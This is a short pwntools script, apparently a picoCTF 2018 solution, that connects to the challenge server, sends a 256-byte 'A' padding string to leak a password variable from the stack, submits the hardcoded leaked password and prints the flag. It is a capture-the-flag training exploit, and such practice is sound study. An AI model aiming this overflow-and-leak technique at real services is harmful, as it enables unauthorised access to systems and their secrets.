from pwn import *

HOST = '2018shell3.picoctf.com'
PORT = 57659

conn = remote(HOST,PORT)
prompt = conn.recv()
print(prompt) #: start of main function prompt

#: sent exploit to leak password variable
exploit = 'A' * 256
conn.send(exploit)
print(conn.recv())

#: leaked variable from stack
passwd = 'a_reAllY_s3cuRe_p4s$word_56b977'
conn.send(passwd)
flag = conn.recvline()
print(flag) #: Flag right here

